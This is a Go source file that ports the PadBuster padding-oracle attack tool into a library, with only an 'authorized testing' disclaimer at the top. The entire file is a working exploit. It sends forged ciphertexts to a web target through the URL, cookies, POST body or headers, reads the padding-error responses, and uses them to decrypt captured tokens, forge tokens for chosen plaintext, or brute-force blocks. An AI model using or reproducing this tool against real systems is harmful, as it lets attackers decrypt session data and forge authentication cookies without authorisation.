// padding-oracle.go
// Go port of PadBuster v0.3.3 as a library for libs/weak-cryptography.
// Modes: decrypt (default), forge (-plaintext), brute force, plus POST, cookie,
// custom header, prefix, no-IV, hex, resume, intermediate and interactive options.
// FOR EDUCATION / AUTHORIZED TESTING ONLY.
package weakcryptography

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"
)

// PaddingOracleOptions configures the padding oracle attack.
type PaddingOracleOptions struct {
	Token        string   // captured ciphertext sample
	Encoding     int      // 0=Base64 1=Lower HEX 2=Upper HEX 3=.NET UrlToken 4=WebSafe Base64
	ErrorMsg     string   // string present in responses with a padding error (optional)
	BlockSize    int      // cipher block size
	Cookies      []string // "name=value" entries; the sample token is substituted into each
	Post         string   // request body for POST targets; the sample token is substituted into it
	Headers      []string // "name: value" entries sent on every request
	Prefix       string   // encoded bytes prepended to every forged sample
	NoEncode     bool     // send the token as-is instead of URL-encoding it
	NoIV         bool     // the sample carries no IV; prepend a null block before attacking
	IgnoreBody   bool     // ignore the response body (PadBuster's -ignorecontent)
	UseBody      bool     // include the response body in the oracle signature
	BruteForce   bool     // recover the intermediate bytes of the first block by brute force
	Interactive  bool     // ask before accepting each recovered byte
	Verbose      bool     // print per-byte progress and every raw oracle response
	PlainText    string   // forge a token for this plaintext instead of decrypting
	EncodedText  string   // same, but the plaintext is already encoded
	CipherText   string   // hex ciphertext used as the starting point when forging
	Intermediate string   // hex intermediate bytes; skips recovery for the first block
	Resume       int      // resume decryption at this block number
}

// oracle holds one attacker session: endpoint, sample placement and learned state.
type oracle struct {
	client      *http.Client
	base        string
	method      string
	cookies     []string
	headers     []string
	post        string
	sample      string
	samplePat   *regexp.Regexp
	encoding    int
	blockSize   int
	errorMsg    string
	signature   string
	prefix      []byte
	noEncode    bool
	useBody     bool
	interactive bool
	verbose     bool
}

var toStd = strings.NewReplacer("-", "+", "_", "/")
var toWeb = strings.NewReplacer("+", "-", "/", "_")

func decodeSample(s string, enc int) ([]byte, error) {
	switch enc {
	case 0:
		return base64.StdEncoding.DecodeString(s)
	case 1, 2:
		return hex.DecodeString(strings.ToLower(s))
	case 3: // .NET UrlToken: trailing digit = number of '=' removed
		if len(s) < 2 {
			return nil, fmt.Errorf("token too short for .NET UrlToken")
		}
		n := int(s[len(s)-1] - '0')
		return base64.StdEncoding.DecodeString(toStd.Replace(s[:len(s)-1]) + strings.Repeat("=", n))
	case 4: // WebSafe Base64
		t := toStd.Replace(s)
		if m := len(t) % 4; m != 0 {
			t += strings.Repeat("=", 4-m)
		}
		return base64.StdEncoding.DecodeString(t)
	}
	return nil, fmt.Errorf("encoding must be 0-4")
}

func encodeSample(b []byte, enc int) string {
	switch enc {
	case 1:
		return hex.EncodeToString(b)
	case 2:
		return strings.ToUpper(hex.EncodeToString(b))
	case 3:
		s := base64.StdEncoding.EncodeToString(b)
		n := strings.Count(s, "=")
		return toWeb.Replace(strings.TrimRight(s, "=")) + strconv.Itoa(n)
	case 4:
		return toWeb.Replace(strings.TrimRight(base64.StdEncoding.EncodeToString(b), "="))
	}
	return base64.StdEncoding.EncodeToString(b)
}

// join concatenates two byte slices without aliasing either of them.
func join(a, b []byte) []byte {
	out := make([]byte, 0, len(a)+len(b))
	out = append(out, a...)
	return append(out, b...)
}

// xorBytes returns a XOR b.
func xorBytes(a, b []byte) []byte {
	n := len(a)
	if len(b) < n {
		n = len(b)
	}
	out := make([]byte, n)
	for i := 0; i < n; i++ {
		out[i] = a[i] ^ b[i]
	}
	return out
}

// substitute replaces every literal occurrence of the captured sample.
func (o *oracle) substitute(s, repl string) string {
	return o.samplePat.ReplaceAllLiteralString(s, repl)
}

// placements reports whether the sample appears in at least one of the request
// components the payload is substituted into, the way PadBuster checks that the
// encrypted sample was actually found before it starts attacking.
func (o *oracle) placements(sample string) bool {
	if strings.Contains(o.base, sample) || strings.Contains(o.post, sample) {
		return true
	}
	for _, c := range o.cookies {
		if strings.Contains(c, sample) {
			return true
		}
	}
	return false
}

// payload renders one forged ciphertext the way PadBuster does: encode, then
// URL-encode unless -noencode was requested.
func (o *oracle) payload(raw []byte) string {
	raw = join(o.prefix, raw)
	enc := encodeSample(raw, o.encoding)
	if o.noEncode {
		return enc
	}
	return url.QueryEscape(enc)
}

// send performs one request and returns the response signature and body.
func (o *oracle) send(payload string) (string, string, error) {
	tgt := o.substitute(o.base, payload)
	req, err := http.NewRequest(o.method, tgt, nil)
	if err != nil {
		return "", "", err
	}
	if o.post != "" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Body = io.NopCloser(strings.NewReader(o.substitute(o.post, payload)))
	}
	if len(o.cookies) > 0 {
		parts := make([]string, 0, len(o.cookies))
		for _, c := range o.cookies {
			parts = append(parts, o.substitute(c, payload))
		}
		req.Header.Set("Cookie", strings.Join(parts, "; "))
	}
	for _, h := range o.headers {
		name, value, ok := strings.Cut(h, ":")
		if !ok {
			continue
		}
		req.Header.Set(strings.TrimSpace(name), strings.TrimSpace(value))
	}

	var resp *http.Response
	for attempt := 1; attempt <= 3; attempt++ {
		if resp, err = o.client.Do(req); err == nil {
			break
		}
		fmt.Printf("ERROR: %v - retrying...\n", err)
		time.Sleep(2 * time.Second)
	}
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", "", err
	}
	loc := resp.Header.Get("Location")
	if loc == "" {
		loc = "N/A"
	}
	body := string(data)
	if o.verbose {
		fmt.Printf("[verbose] %s %s\n[verbose] -> %d | %d | %s\n", o.method, tgt, resp.StatusCode, len(body), loc)
		fmt.Printf("[verbose] body: %q\n", body)
	}
	sig := fmt.Sprintf("%d\t%d\t%s", resp.StatusCode, len(body), loc)
	if o.useBody {
		sig += "\t" + body
	}
	return sig, body, nil
}

// check reports whether the server accepted the forged sample, i.e. whether the
// response did NOT carry the padding-error marker or signature.
func (o *oracle) check(raw []byte) (bool, string, error) {
	sig, body, err := o.send(o.payload(raw))
	if err != nil {
		return false, "", err
	}
	if o.errorMsg != "" {
		return !strings.Contains(body, o.errorMsg), sig, nil
	}
	return sig != o.signature, sig, nil
}

// analyze probes all 256 values of the last byte of the target block, reports the
// observed response signatures and adopts the most frequent one as the error
// signature (PadBuster determineSignature).
func (o *oracle) analyze(cur []byte) error {
	counts := map[string]int{}
	for i := 0; i < 256; i++ {
		test := make([]byte, o.blockSize)
		test[o.blockSize-1] = byte(i)
		sig, _, err := o.send(o.payload(join(test, cur)))
		if err != nil {
			return err
		}
		counts[sig]++
	}
	if len(counts) == 1 {
		return fmt.Errorf("all responses identical; provide --error-msg (or --po-ignore-body)")
	}
	sigs := make([]string, 0, len(counts))
	for s := range counts {
		sigs = append(sigs, s)
	}
	sort.Slice(sigs, func(i, j int) bool { return counts[sigs[i]] > counts[sigs[j]] })
	fmt.Println("The following response signatures were returned:")
	for _, s := range sigs {
		line := fmt.Sprintf("  %5d x  %s", counts[s], strings.ReplaceAll(s, "\t", " | "))
		if s == sigs[0] {
			line += " **"
		}
		fmt.Println(line)
	}
	o.signature = sigs[0]
	fmt.Printf("[+] Padding-error signature = most frequent (%d/256)\n", counts[sigs[0]])
	return nil
}

// blockIntermediate recovers D_k(cur) byte by byte at the high end of testBytes.
func (o *oracle) blockIntermediate(testBytes, sample []byte) ([]byte, error) {
	bs := o.blockSize
	if len(testBytes) < bs {
		testBytes = join(make([]byte, bs-len(testBytes)), testBytes)
	}
	inter := make([]byte, bs)
	for byteNum := bs - 1; byteNum >= 0; byteNum-- {
		pad := byte(bs - byteNum)
		next := pad + 1
		found := false
		for i := 255; i >= 0; i-- {
			testBytes[byteNum] = byte(i)
			valid, _, err := o.check(join(testBytes, sample))
			if err != nil {
				return nil, err
			}
			if !valid {
				continue
			}
			inter[byteNum] = byte(i) ^ pad
			found = true
			if o.verbose {
				fmt.Printf("[verbose] byte %2d: test=%#02x inter=%#02x pad=%#02x\n", byteNum, i, inter[byteNum], pad)
			}
			if o.interactive && !o.ask(fmt.Sprintf("Use %#02x for byte %d?", inter[byteNum], byteNum)) {
				continue
			}
			break
		}
		if !found {
			return nil, fmt.Errorf("no valid response for byte %d", byteNum)
		}
		for k := byteNum; k < bs; k++ {
			testBytes[k] ^= pad ^ next
		}
	}
	return inter, nil
}

// bruteForce enumerates the first three bytes of the forged block and reports any
// response that differs from the error signature (PadBuster -bruteforce). It needs
// up to 16.7M requests, so it is opt-in and resumable with -po-resume.
func (o *oracle) bruteForce(encrypted []byte, resume int) error {
	bs := o.blockSize
	if bs < 3 {
		return fmt.Errorf("brute force needs a block size of at least 3")
	}
	fmt.Println("INFO: Starting PadBuster Brute Force Mode")
	if resume > 0 {
		fmt.Printf("INFO: Resuming previous brute force at attempt %d\n", resume)
	}
	attempts := 0
	for c := 0; c < 256; c++ {
		for d := 0; d < 256; d++ {
			for b := 0; b < 256; b++ {
				attempts++
				if resume > 0 && attempts < resume-resume%256+1 {
					continue
				}
				test := make([]byte, bs)
				test[0], test[1], test[2] = byte(b), byte(c), byte(d)
				sig, _, err := o.send(o.payload(join(test, encrypted)))
				if err != nil {
					return err
				}
				if o.signature != "" && sig != o.signature {
					fmt.Printf("\nAttempt %d - %s (prefill %02x%02x%02x)\n", attempts, strings.ReplaceAll(sig, "\t", " | "), b, c, d)
				}
				if attempts%5000 == 0 {
					fmt.Printf("[+] %d attempts issued...\n", attempts)
				}
			}
		}
	}
	return nil
}

// forge builds a token that decrypts to the requested plaintext (PadBuster encrypt
// mode). It works from the high block down, recovering the intermediate bytes with
// the same oracle and chaining them into the previous ciphertext block.
func (o *oracle) forge(pt []byte, cipherHex, interHex string) ([]byte, error) {
	bs := o.blockSize
	blockCount := int(float64(len(pt)+1)/float64(bs) + 0.99)
	fmt.Printf("[+] Number of Blocks: %d\n", blockCount)
	padCount := bs*blockCount - len(pt)
	pt = join(pt, bytesOf(byte(padCount), padCount))

	forged, err := hex.DecodeString(cipherHex)
	if cipherHex != "" && err != nil {
		return nil, fmt.Errorf("bad -po-ciphertext hex: %w", err)
	}
	if cipherHex == "" {
		forged = make([]byte, bs)
	}
	sample := append([]byte{}, forged...)

	for blockNum := blockCount; blockNum > 0; blockNum-- {
		var inter []byte
		if interHex != "" && blockNum == blockCount {
			if inter, err = hex.DecodeString(interHex); err != nil {
				return nil, fmt.Errorf("bad -po-intermediate hex: %w", err)
			}
		} else if inter, err = o.blockIntermediate(make([]byte, bs), sample); err != nil {
			return nil, err
		}
		sample = xorBytes(inter, pt[(blockNum-1)*bs:blockNum*bs])
		forged = join(sample, forged)
		fmt.Printf("\nBlock %d Results:\n", blockNum)
		fmt.Printf("[+] New Cipher Text (HEX): %x\n", sample)
		fmt.Printf("[+] Intermediate Bytes (HEX): %x\n", inter)
	}
	return forged, nil
}

// decrypt walks the ciphertext from the second block on, recovering each
// intermediate block and XORing it with the preceding block to get plaintext.
func (o *oracle) decrypt(encrypted []byte, resume int) ([]byte, error) {
	bs := o.blockSize
	blockCount := len(encrypted) / bs
	iv := encrypted[:bs]

	fmt.Println("INFO: Starting PadBuster Decrypt Mode")
	if resume > 0 {
		fmt.Printf("INFO: Resuming previous exploit at Block %d\n", resume)
	}
	if resume == 0 {
		resume = 1
	}

	var plain []byte
	for blockNum := resume + 1; blockNum <= blockCount; blockNum++ {
		fmt.Printf("*** Starting Block %d of %d ***\n", blockNum-1, blockCount-1)
		sample := encrypted[(blockNum-1)*bs : blockNum*bs]
		inter, err := o.blockIntermediate(make([]byte, bs), sample)
		if err != nil {
			return nil, err
		}
		var dec []byte
		if blockNum == 2 {
			dec = xorBytes(inter, iv)
		} else {
			dec = xorBytes(inter, encrypted[(blockNum-2)*bs:(blockNum-1)*bs])
		}
		fmt.Printf("\nBlock %d Results:\n", blockNum-1)
		fmt.Printf("[+] Cipher Text (HEX): %x\n", sample)
		fmt.Printf("[+] Intermediate Bytes (HEX): %x\n", inter)
		fmt.Printf("[+] Plain Text: %s\n", dec)
		plain = append(plain, dec...)
	}
	return plain, nil
}

// bytesOf returns n copies of b.
func bytesOf(b byte, n int) []byte {
	if n < 0 {
		n = 0
	}
	out := make([]byte, n)
	for i := range out {
		out[i] = b
	}
	return out
}

// ask prompts the operator (PadBuster -interactive).
func (o *oracle) ask(prompt string) bool {
	fmt.Printf("%s [y/n]: ", prompt)
	var answer string
	if _, err := fmt.Scanln(&answer); err != nil {
		return false
	}
	answer = strings.ToLower(strings.TrimSpace(answer))
	return strings.HasPrefix(answer, "y")
}

// resolveOracleTarget adds a scheme when missing and applies a port override.
func resolveOracleTarget(rawURL, port string) (string, error) {
	if !strings.Contains(rawURL, "://") {
		rawURL = "http://" + rawURL
	}
	u, err := url.Parse(rawURL)
	if err != nil {
		return "", err
	}
	if u.Hostname() == "" {
		return "", fmt.Errorf("no host in %q", rawURL)
	}
	host := u.Hostname()
	if port != "" {
		host = host + ":" + port
	} else if u.Port() != "" {
		host = host + ":" + u.Port()
	}
	result := u.Scheme + "://" + host + u.Path
	if u.RawQuery != "" {
		result += "?" + u.RawQuery
	}
	return result, nil
}

// PaddingOracle runs the requested attack against the oracle described by opts.
func PaddingOracle(rawURL, port string, opts PaddingOracleOptions) {
	bs := opts.BlockSize
	o := &oracle{
		client: &http.Client{Timeout: 30 * time.Second, CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		}},
		method:      http.MethodGet,
		cookies:     opts.Cookies,
		headers:     opts.Headers,
		post:        opts.Post,
		sample:      opts.Token,
		samplePat:   regexp.MustCompile(regexp.QuoteMeta(opts.Token)),
		encoding:    opts.Encoding,
		blockSize:   bs,
		errorMsg:    opts.ErrorMsg,
		useBody:     opts.UseBody && !opts.IgnoreBody,
		interactive: opts.Interactive,
		noEncode:    opts.NoEncode,
		verbose:     opts.Verbose,
	}
	if opts.Post != "" {
		o.method = http.MethodPost
	}

	if opts.Token == "" {
		fmt.Println("ERROR: --token is required")
		return
	}
	if opts.Encoding < 0 || opts.Encoding > 4 {
		fmt.Println("ERROR: --encoding must be between 0 and 4")
		return
	}
	if bs <= 0 {
		fmt.Println("ERROR: --block-size must be greater than zero")
		return
	}

	tmpl, err := resolveOracleTarget(rawURL, port)
	if err != nil {
		fmt.Println("ERROR:", err)
		return
	}
	o.base = tmpl
	if !strings.Contains(o.base, opts.Token) && !o.placements(opts.Token) {
		fmt.Println("ERROR: encrypted sample was not found in the test request")
		return
	}

	if opts.Prefix != "" {
		if o.prefix, err = decodeSample(opts.Prefix, opts.Encoding); err != nil {
			fmt.Println("ERROR: cannot decode --po-prefix:", err)
			return
		}
	}

	encrypted, err := decodeSample(opts.Token, opts.Encoding)
	if err != nil {
		fmt.Println("ERROR: cannot decode token:", err)
		return
	}
	if len(encrypted)%bs != 0 {
		fmt.Printf("ERROR: encrypted bytes (%d) are not evenly divisible by the block size (%d)\n", len(encrypted), bs)
		return
	}
	originalCT := encrypted
	if opts.NoIV && !opts.BruteForce && opts.PlainText == "" && opts.EncodedText == "" {
		encrypted = join(make([]byte, bs), encrypted)
	}
	blockCount := len(encrypted) / bs

	fmt.Println("INFO: The original request returned the following")
	if sig, body, err := o.send(o.payload(originalCT)); err != nil {
		fmt.Println("ERROR:", err)
		return
	} else {
		fmt.Printf("[+] %s\n[+] Response: %s\n", strings.ReplaceAll(sig, "\t", " | "), body)
	}

	if opts.ErrorMsg == "" && !opts.IgnoreBody {
		if err := o.analyze(encrypted[bs : 2*bs]); err != nil {
			fmt.Println("ERROR:", err)
			return
		}
	}

	switch {
	case opts.PlainText != "" || opts.EncodedText != "":
		plain := []byte(opts.PlainText)
		if opts.EncodedText != "" {
			if plain, err = decodeSample(opts.EncodedText, opts.Encoding); err != nil {
				fmt.Println("ERROR: cannot decode --po-encodedtext:", err)
				return
			}
		}
		forged, err := o.forge(plain, opts.CipherText, opts.Intermediate)
		if err != nil {
			fmt.Println("ERROR:", err)
			return
		}
		fmt.Println("-------------------------------------------------------")
		fmt.Println("** Finished ***")
		fmt.Printf("[+] Encrypted value is: %s\n", url.QueryEscape(encodeSample(forged, opts.Encoding)))
		fmt.Println("-------------------------------------------------------")

	case opts.BruteForce:
		if err := o.bruteForce(encrypted, opts.Resume); err != nil {
			fmt.Println("ERROR:", err)
			return
		}

	default:
		if blockCount < 2 {
			fmt.Println("ERROR: There is only one block. Try again using -noiv.")
			return
		}
		plain, err := o.decrypt(encrypted, opts.Resume)
		if err != nil {
			fmt.Println("ERROR:", err)
			return
		}
		fmt.Println("-------------------------------------------------------")
		fmt.Println("** Finished ***")
		fmt.Printf("[+] Decrypted value (ASCII): %s\n", plain)
		fmt.Printf("[+] Decrypted value (HEX): %X\n", plain)
		fmt.Printf("[+] Decrypted value (Base64): %s\n", base64.StdEncoding.EncodeToString(plain))
		fmt.Println("-------------------------------------------------------")
	}
}
